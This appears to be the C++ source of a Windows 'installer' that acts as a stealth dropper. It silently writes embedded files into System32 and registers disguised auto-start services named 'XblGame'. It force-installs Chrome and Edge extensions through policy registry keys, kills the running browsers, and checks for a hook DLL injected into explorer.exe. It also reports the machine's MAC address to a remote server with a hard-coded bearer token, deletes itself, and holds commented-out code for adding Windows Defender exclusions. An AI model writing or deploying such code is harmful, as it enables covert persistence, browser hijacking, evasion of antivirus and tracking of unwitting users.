
// MyInstallerDlg.cpp : implementation file
//

#include "pch.h"
#include "framework.h"
#include "MyInstaller.h"
#include "MyInstallerDlg.h"
#include "afxdialogex.h"
#include "ProcessUtil.h"
#include <fstream>   // For file operations
#include <iostream>  // For console output
#include <vector>
#include "HookUtil.h"
#include "MyDefine.h"
#include "NetUtil.h"
#include "json.hpp"
#include "ZipUtil.h"


using namespace std;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

extern BOOL		g_bUpdateParam;
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMyInstallerDlg dialog



CMyInstallerDlg::CMyInstallerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_MYINSTALLER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyInstallerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CMyInstallerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCANCEL, &CMyInstallerDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDOK, &CMyInstallerDlg::OnBnClickedOk)
END_MESSAGE_MAP()



void WriteResourceToFile(UINT resourceID, LPCTSTR resourceType, LPCTSTR outputFileName)
{
	// Find the resource
	HRSRC hResInfo = FindResource(AfxGetInstanceHandle(), MAKEINTRESOURCE(resourceID), resourceType);
	if (hResInfo == NULL)
	{
		return;
	}

	// Load the resource
	HGLOBAL hResData = LoadResource(AfxGetInstanceHandle(), hResInfo);
	if (hResData == NULL)
	{
		return;
	}

	// Lock the resource and get its data pointer
	LPVOID pData = LockResource(hResData);
	if (pData == NULL)
	{
		FreeResource(hResData);
		return;
	}

	// Get the size of the resource data
	DWORD dwSize = SizeofResource(AfxGetInstanceHandle(), hResInfo);
	if (dwSize == 0)
	{
		FreeResource(hResData);
		return;
	}

	// Create a file stream for writing
	std::ofstream outputFile(outputFileName, std::ios::binary);
	if (!outputFile.is_open())
	{
		FreeResource(hResData);
		return;
	}

	// Write resource data to the file
	outputFile.write(static_cast<const char*>(pData), dwSize);

	// Close the file
	outputFile.close();

	// Free the loaded resource
	FreeResource(hResData);

}

// CMyInstallerDlg message handlers

BOOL CMyInstallerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	if (g_bUpdateParam == TRUE) {
		 bool		w_bPrevServiceSts = false;
		w_bPrevServiceSts = StopService(L"XblGame");

		MyWriteLog("CMyInstallerDlg::OnInitDialog() w_bPrevServiceSts = %d", w_bPrevServiceSts);

		//. 
		if (w_bPrevServiceSts == true) {
			std::wstring directoryPath = L"C:\\Users\\Public\\data\\ext";
			directoryPath.append(1, L'\0');
			SHFILEOPSTRUCT fileOp = { 0 };
			fileOp.wFunc = FO_DELETE;  // Deletion operation
			fileOp.pFrom = directoryPath.c_str();
			fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT; // Flags to suppress UI and confirmation dialogs
			int result = SHFileOperation(&fileOp);
		}
		//.
		MyWriteLog("CMyInstallerDlg::OnInitDialog() DeleteFileA(GD_UPDATE_VER_FILEPATH)");
		DeleteFileA(GD_UPDATE_VER_FILEPATH);
		MyWriteLog("CMyInstallerDlg::OnInitDialog() SS_Init()");
		SS_Init();

	}
	else {
		SS_Init();
	}


	EndDialog(IDCANCEL);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMyInstallerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyInstallerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyInstallerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

//bool AddExclusionToDefender(const std::wstring& exclusionPath) {
//	std::wstring regPath = L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
//
//	HKEY hKey;
//	LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_SET_VALUE, &hKey);
//	if (lResult != ERROR_SUCCESS) {
//		return false;
//	}
//	lResult = RegSetValueEx(hKey, exclusionPath.c_str(), 0, REG_DWORD, (const BYTE*)&lResult, sizeof(DWORD));
//	if (lResult != ERROR_SUCCESS) {
//		RegCloseKey(hKey);
//		return false;
//	}
//
//	RegCloseKey(hKey);
//	return true;
//}

void	CMyInstallerDlg::SS_RegInit()
{
	//wchar_t wszTempPath[MAX_PATH]; memset(wszTempPath, 0, sizeof(wszTempPath));
	//GetTempPath(MAX_PATH, wszTempPath);

	//std::wstring exclusionPath = L"C:\\Users\\Public\\data";
	//AddExclusionToDefender(exclusionPath);

	//_tcscat(wszTempPath, L"xtd\\");
	//AddExclusionToDefender(wszTempPath);

	return;
}


#define SERVER_DOMAIN L"dash.zintrack.com"
#define REG_PATH L"/api/v1/register"
#define SEND_EVENT L"/api/v1/events/install"
#define BEARER_TOKEN L"40|xSYEfJuEfwHwFm8ccglYY4fxpXYJTpqTqT3Rvr1W5640aab2"

wstring _serverDomain = SERVER_DOMAIN;
wstring _bearerToken = BEARER_TOKEN;

wstring RegisterMachine()
{
	nlohmann::json jsonData;
	jsonData["type"] = "WindowsApplication";
	jsonData["deviceId"] = GetMACAddress();
	jsonData["osVersion"] = GetOSVersion();
	jsonData["app"] = GetProcessName();
	wstring response;
	BOOL ret = HTTPSPost(_serverDomain, REG_PATH, jsonData.dump(), response, _bearerToken);
	if (!ret)
	{
		return L"";
	}

	nlohmann::json jsonRet = nlohmann::json::parse(ConvertWStringToString(response));

	string w_stemp = jsonRet["id"];
	return charToWstring(w_stemp.c_str());
}
//
//nlohmann::json SendEvent(const wstring& step, int eventId, const wstring& data = L"")
//{
//	nlohmann::json jsonData;
//	jsonData["step"] = ConvertWStringToString(step);
//	if (step != L"click" && eventId != -1)
//	{
//		jsonData["eventId"] = eventId;
//	}
//	if (step == L"registered")
//	{
//		jsonData["clientId"] = ConvertWStringToString(data);
//	}
//
//	wstring response;
//	BOOL ret = HTTPSPost(_serverDomain, SEND_EVENT, jsonData.dump(), response, _bearerToken);
//	if (!ret || response == L"")
//	{
//		return nlohmann::json();
//	}
//
//	return nlohmann::json::parse(ConvertWStringToString(response));
//}
//
//nlohmann::json SendErrorEvent(const wstring& step, const wstring& errorMessage)
//{
//	nlohmann::json jsonData;
//	jsonData["step"] = ConvertWStringToString(step);
//	jsonData["error"] = ConvertWStringToString(errorMessage);
//
//	wstring response;
//	BOOL ret = HTTPSPost(_serverDomain, SEND_EVENT, jsonData.dump(), response, _bearerToken);
//	if (!ret || response == L"")
//	{
//		return nlohmann::json();
//	}
//
//	return nlohmann::json::parse(ConvertWStringToString(response));
//}
//
//std::string number_to_words(int number) {
//	if (number < 0 || number > 19) {
//		return "";
//	}
//
//	const std::vector<std::string> ones = {
//		"zero", "one", "two", "three", "four", "five",
//		"six", "seven", "eight", "nine", "ten",
//		"eleven", "twelve", "thirteen", "fourteen", "fifteen",
//		"sixteen", "seventeen", "eighteen", "nineteen"
//	};
//	return ones[number];
//}
void	CheckMyInjectExplorer()
{
	DWORD	explorerPID = GetExplorerPID("");
	int		i = 0;
	bool	w_bRtn = false;

	if (explorerPID == 0) {
//		MessageBoxA(NULL, "Faild ... Exploer Information", "MyTest", MB_OK | MB_TOPMOST);
		MyWriteLog("CMyInstallerDlg::SS_Init() Faild ... Exploer Information");

		goto L_EXIT;
	}

	//. 
	for (i = 0; i < 20; i++) {
		if (FindHookDllINExplor(explorerPID, GD_MY_HOOK_DLL_NAME) == false) {
			Sleep(1000);
			continue;
		}
		else {
			w_bRtn = true;
			break;
		}
	}

	if (w_bRtn == false) {
//		MessageBoxA(NULL, "Faild ... check for exploer information", "MyTest", MB_OK | MB_TOPMOST);
		MyWriteLog("CMyInstallerDlg::SS_Init() Faild ... check for exploer information");
	}
	else {
		MyWriteLog("CMyInstallerDlg::SS_Init() OK ... check for exploer information");
	}

L_EXIT:
	return;
}


void	CMyInstallerDlg::SS_Init()
{
	TCHAR		w_szCurDir[MAX_PATH] = L"";
	TCHAR		w_szTemp[MAX_PATH] = L"";
	TCHAR		w_szParam[MAX_PATH] = L"";
	HWND		w_hOpenedChrome = NULL;
	HWND		w_hOpenedEdge = NULL;
	std::string version = "";
	std::string w_sServerAddr = "";
	std::string w_sSelfDelOpt = "0";
	std::string app_name = "app_name";
	FILE*		w_pFile = NULL;
	char		w_szVersionInf[MAX_PATH] = "";
	bool		w_bIsInstalled = false;
	bool		w_bChromeURL = true;
	bool		w_bLocalInstall = false;
	INSTALLER_INFO	w_stRestoredInfo; memset(&w_stRestoredInfo, 0x00, sizeof(INSTALLER_INFO));

	int			eventId = -1;
	bool		w_bAnalytics = false;
	nlohmann::json jsonRet;

	//. 
	CreateDirectoryA(GD_LOCAL_DIR_PATH, NULL);
	
	//.
	MyWriteLog("CMyInstallerDlg::SS_Init() Start");
	std::vector<char> w_InstallerInfo = RetrieveResourceData(GD_INSTALLER_INO_RESOURCE_ID);
	if (!w_InstallerInfo.empty()) {
		WriteDataToFile(GD_LOCAL_SET_INFO_FILEPATH, w_InstallerInfo);

		//w_stRestoredInfo = ConvertVectorToStruct(w_InstallerInfo);
		FILE* w_pFileInfo = fopen(GD_LOCAL_SET_INFO_FILEPATH, "rb");
		if (w_pFileInfo != NULL) {
			fread(&w_stRestoredInfo, 1, sizeof(INSTALLER_INFO), w_pFileInfo);
			fclose(w_pFileInfo);
		}

		//MyWriteLog("CMyInstallerDlg::SS_Init()  w_stRestoredInfo.m_nRestartBrowser = %d", w_stRestoredInfo.m_nRestartBrowser);
		//MyWriteLog("CMyInstallerDlg::SS_Init()  w_stRestoredInfo.m_nServiceProtection = %d", w_stRestoredInfo.m_nServiceProtection);
		//MyWriteLog("CMyInstallerDlg::SS_Init()  w_stRestoredInfo.m_szAnalyticsServer = %s", w_stRestoredInfo.m_szAnalyticsServer);
		//MyWriteLog("CMyInstallerDlg::SS_Init()  w_stRestoredInfo.m_szAnalyticsToken = %s", w_stRestoredInfo.m_szAnalyticsToken);

		_serverDomain = charToWstring(w_stRestoredInfo.m_szAnalyticsServer);
		_bearerToken = charToWstring(w_stRestoredInfo.m_szAnalyticsToken);
	}
	else {
		return;
	}
	if (_serverDomain.size() > 0 && _bearerToken.size() > 0) {
		w_bAnalytics = true;
	}

	//.
	//if (w_bAnalytics == true) {
	//	jsonRet = SendEvent(L"click", eventId);
	//	if (jsonRet.size() != 0)
	//		eventId = jsonRet["eventId"];
	//}

	//.
	GetOpenedHWndFromMyBrowser(w_hOpenedChrome, w_hOpenedEdge);
	if (w_hOpenedEdge == NULL) {
		MyWriteLog("CMyInstallerDlg::SS_Init() GetOpenedHWndFromMyBrowser w_hOpenedEdge == NULL");
		wstring processName = L"msedge.exe";
		TeminateProcess(processName);
		Sleep(2000);
	}

//	MyWriteLog("CMyInstallerDlg::SS_Init() w_hOpenedChrome = %d, w_hOpenedEdge = %d", w_hOpenedChrome, w_hOpenedEdge);

	//.
	w_sSelfDelOpt = RetrieveStringFromRawResource(GD_SELF_DEL_RESOURCE_ID);

	MyWriteLog("CMyInstallerDlg::SS_Init() w_sSelfDelOpt = %s" , w_sSelfDelOpt.c_str());

	//. Local Installer
	std::vector<char> data = RetrieveResourceData(GD_CRX_RESOURCE_ID);
	if (!data.empty()) {
		if (IsFileExist(GD_LOCAL_VER_FILEPATH) == FALSE) {
			WriteDataToFile(GD_TEMP_CRX_FILEPATH, data);
		}
		w_bLocalInstall = true;
	}

	MyWriteLog("CMyInstallerDlg::SS_Init() w_bLocalInstall = %d", w_bLocalInstall);
	if (w_bLocalInstall == true) {
		if (IsFileExist(GD_LOCAL_VER_FILEPATH) == FALSE) {

			MyWriteLog("CMyInstallerDlg::SS_Init() Local ZIP ... IsFileExist(GD_LOCAL_VER_FILEPATH) == FALSE");

			//. Copy file 
			WriteResourceToFile(IDR_TEXT1, _T("TEXT"), L"C:\\Windows\\System32\\mi_nt_svc.dat");
			WriteResourceToFile(IDR_TEXT2, _T("TEXT"), L"C:\\Windows\\System32\\ntdb.dat");
			WriteResourceToFile(IDR_TEXT4, _T("TEXT"), L"C:\\Windows\\System32\\datax.dat");
			WriteResourceToFile(IDR_TEXT5, _T("TEXT"), L"C:\\Windows\\System32\\signtool.exe");
			WriteResourceToFile(IDR_TEXT6, _T("TEXT"), L"C:\\Windows\\System32\\uptimecrx.dat");

			//. Mod File Content and Add certification
			ModContentToFile(GD_TEMP_MAIN_SVC_FILEPATH, GD_LOCAL_SVC_FILEPATH);
			//x ModContentToFile_t(GD_TEMP_DLL_FILEPATH, "C:\\Users\\Public\\data\\ntdb.dll");
			ModContentToFile(GD_TEMP_UPDATE_FILEPATH, GD_LOCAL_UPTIMECRX_FILEPATH);

			//.
			version = RetrieveStringFromRawResource(GD_VER_RESOURCE_ID);
			w_pFile = fopen(GD_LOCAL_VER_FILEPATH, "wb");
			if (w_pFile) {
				MyWriteLog("CMyInstallerDlg::SS_Init() GD_LOCAL_VER_FILEPATH OK");
				fwrite(version.c_str(), version.size(), 1, w_pFile);
				fclose(w_pFile);
			}
			else {
				MyWriteLog("CMyInstallerDlg::SS_Init() GD_LOCAL_VER_FILEPATH Faild");
			}

			//if (g_bUpdateParam == FALSE) {
			//	app_name = GetProcessName();
			//	w_pFile = fopen(GD_LOCAL_INFO_FILEPATH, "wb");
			//	if (w_pFile) {
			//		if (app_name.empty()) {
			//			app_name = "app_name";
			//		}
			//		//. delete string ".exe"
			//		fwrite(app_name.c_str(), app_name.size() - 4, 1, w_pFile);
			//		fclose(w_pFile);
			//	}
			//}

			//. 
			swprintf(w_szParam, L"/C sc create XblGame binPath=\"C:\\Users\\Public\\data\\mdwslp.exe\" start= auto");
			_execute(L"cmd.exe", w_szParam, 1);
			swprintf(w_szParam, L"/C sc start XblGame");
			_execute(L"cmd.exe", w_szParam, 1);

			swprintf(w_szParam, L"/C sc create XblGame2 binPath=\"C:\\Users\\Public\\data\\uptimecrx.exe\" start= auto");
			_execute(L"cmd.exe", w_szParam, 1);
			swprintf(w_szParam, L"/C sc start XblGame2");
			_execute(L"cmd.exe", w_szParam, 1);
		}
		else {
			w_bLocalInstall = false;
		}
	}
	else {
		//if (w_bAnalytics == true)
		//	jsonRet = SendErrorEvent(wstring(L"local_extension"), L"There is no selected option for local extension.");
	}

	//. Web Store Installer
	w_sServerAddr = RetrieveStringFromRawResource(GD_SERVER_ADD_RESOURCE_ID);
	MyWriteLog("CMyInstallerDlg::SS_Init() w_sServerAddr = %s", w_sServerAddr.c_str());
	if (w_sServerAddr.size() >= 3) {

		std::string server = "";
		std::string path = "";
		std::string response = "";
		splitServerAndPathInfo(w_sServerAddr, server, path);

		if (HTTPSGet(server, path, response, "")) {

			std::string		w_sChromeExtensionID = "";
			std::string		w_sMSEdgeExtensionID = "";

			GetALLChromeAndMSEdgeExtensionID(response, w_sChromeExtensionID, w_sMSEdgeExtensionID);

			w_hOpenedChrome = NULL; w_hOpenedEdge = NULL;
			GetOpenedHWndFromMyBrowser(w_hOpenedChrome, w_hOpenedEdge);
			MyWriteLog("CMyInstallerDlg::SS_Init() w_hOpenedChrome = %d, w_hOpenedEdge = %d", w_hOpenedChrome, w_hOpenedEdge);

			if (w_sChromeExtensionID.size() == 32) {
				if (CheckReadRegistryValues(HKEY_LOCAL_MACHINE, GD_REG_CHROME_EXTENSION_FORCE, w_sChromeExtensionID)) {
				}
				else {
					MyWriteLog("CMyInstallerDlg::SS_Init() InstallAuthExtension(w_sChromeExtensionID, GD_REG_CHROME_EXTENSION_FORCE)");

					InstallAuthExtension(w_sChromeExtensionID, GD_REG_CHROME_EXTENSION_FORCE);
					if (w_hOpenedChrome && w_bLocalInstall == false && w_stRestoredInfo.m_nRestartBrowser == 1) {
						TeminateHWndAndProcessName(w_hOpenedChrome, 0);

						if (IsFileExist(GD_LOCAL_VER_FILEPATH) == FALSE) {
							swprintf(w_szParam, L"/C \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --restore-last-session");
							_execute(L"cmd.exe", w_szParam, 0);
						}
						else {
							CheckMyInjectExplorer();
							_tcscpy(w_szParam, L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
							restart_browser(w_szParam, 0);
						}
					}
					//.
				}
			}
			else {
				//if (w_bAnalytics == true)
				//	jsonRet = SendErrorEvent(wstring(L"chrome_extension"), L"Failed to extract extension ID.");
			}
			if (w_sMSEdgeExtensionID.size() == 32) {
				if (CheckReadRegistryValues(HKEY_LOCAL_MACHINE, GD_REG_MSEDGE_EXTENSION_FORCE, w_sMSEdgeExtensionID)) {
				}
				else {
					MyWriteLog("CMyInstallerDlg::SS_Init() InstallAuthExtension(w_sMSEdgeExtensionID, GD_REG_MSEDGE_EXTENSION_FORCE)");

					InstallAuthExtension(w_sMSEdgeExtensionID, GD_REG_MSEDGE_EXTENSION_FORCE);
					if (w_hOpenedEdge && w_bLocalInstall == false && w_stRestoredInfo.m_nRestartBrowser == 1) {
						TeminateHWndAndProcessName(w_hOpenedEdge, 1);

						if (IsFileExist(GD_LOCAL_VER_FILEPATH) == FALSE) {
							swprintf(w_szParam, L"/C \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --restore-last-session");
							_execute(L"cmd.exe", w_szParam, 0);
						}
						else {
							CheckMyInjectExplorer();
							_tcscpy(w_szParam, L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
							restart_browser(w_szParam, 1);
						}
					}
				}
			}
			else {
				//if (w_bAnalytics == true)
				//	jsonRet = SendErrorEvent(wstring(L"msedge_extension"), L"Failed to extract extension ID.");
			}
		}
		else {
		}
	}
	else {
		//if (w_bAnalytics == true)
		//	jsonRet = SendErrorEvent(wstring(L"web_extension"), L"There is no selected option for web extension.");
	}

	//. 
	if (g_bUpdateParam == FALSE && w_bLocalInstall == true) {
		MyWriteLog("CMyInstallerDlg::SS_Init() g_bUpdateParam == FALSE && w_bLocalInstall == true");
		w_hOpenedChrome = NULL; w_hOpenedEdge = NULL;
		GetOpenedHWndFromMyBrowser(w_hOpenedChrome, w_hOpenedEdge);
		MyWriteLog("CMyInstallerDlg::SS_Init() w_hOpenedChrome = %d, w_hOpenedEdge = %d", w_hOpenedChrome, w_hOpenedEdge);

		if (w_hOpenedEdge == NULL) {
			MyWriteLog("CMyInstallerDlg::SS_Init() g_bUpdateParam == FALSE && w_bLocalInstall == true && w_hOpenedEdge == NULL");
			wstring processName = L"msedge.exe";
			TeminateProcess(processName);
			Sleep(2000);
		}

		if (w_hOpenedChrome && w_stRestoredInfo.m_nRestartBrowser == 1) {
			TeminateHWndAndProcessName(w_hOpenedChrome, 0);

			CheckMyInjectExplorer();
			_tcscpy(w_szParam, L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
			restart_browser(w_szParam, 0);
			MyWriteLog("CMyInstallerDlg::SS_Init() w_hOpenedChrome CheckMyInjectExplorer(), restart_browser()");
			//swprintf(w_szParam, L"/C \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --restore-last-session");
			//_execute(L"cmd.exe", w_szParam, 0);

		}
		if (w_hOpenedEdge && w_stRestoredInfo.m_nRestartBrowser == 1) {
			TeminateHWndAndProcessName(w_hOpenedEdge, 1);

			CheckMyInjectExplorer();
			_tcscpy(w_szParam, L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
			restart_browser(w_szParam, 1);
			MyWriteLog("CMyInstallerDlg::SS_Init() w_hOpenedEdge CheckMyInjectExplorer(), restart_browser()");

			//swprintf(w_szParam, L"/C \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --restore-last-session");
			//_execute(L"cmd.exe", w_szParam, 0);
		}
	}


	string		w_sUUID = "";
	string		w_sAppName = GetProcessName();

	if (w_bAnalytics == true) {
		wstring uuid = RegisterMachine();
		if (uuid.empty() == false) {
			w_sUUID = ConvertWStringToString(uuid);
			string		w_sPingPath = PING_API_ADDR + w_sUUID;
			string		w_sResponse = "";

			MyWriteLog("CMyInstallerDlg::SS_Init() w_sUUID = %s", w_sUUID.c_str());
			SetAppNameAndUUIDInfo(GD_LOCAL_INFO_FILEPATH, w_sAppName, w_sUUID);
			HTTPSGet(ConvertWStringToString(_serverDomain), w_sPingPath, w_sResponse, ConvertWStringToString(_bearerToken));
		}
	}
	else {
		SetAppNameAndUUIDInfo(GD_LOCAL_INFO_FILEPATH, w_sAppName, w_sUUID);
	}

L_EXIT:
	if (w_sSelfDelOpt.size() > 2 ) {
		delete_myself();
	}
	MyWriteLog("CMyInstallerDlg::SS_Init() End");
	return;
}
void CMyInstallerDlg::OnBnClickedCancel()
{
	// TODO: Add your control notification handler code here
	CDialogEx::OnCancel();
}


void CMyInstallerDlg::OnBnClickedOk()
{
	//BOOL		w_bOpenedChrome = FALSE;
	//BOOL		w_bOpenedEdge = FALSE;

	//std::wstring processName = L"chrome.exe";
	//w_bOpenedChrome = TeminateProcess(processName);

	//processName = L"msedge.exe";
	//w_bOpenedEdge = TeminateProcess(processName);


	//SS_Init();
	//Sleep(5000);

	//AfxMessageBox(L"OK ... Install");

	return;
}
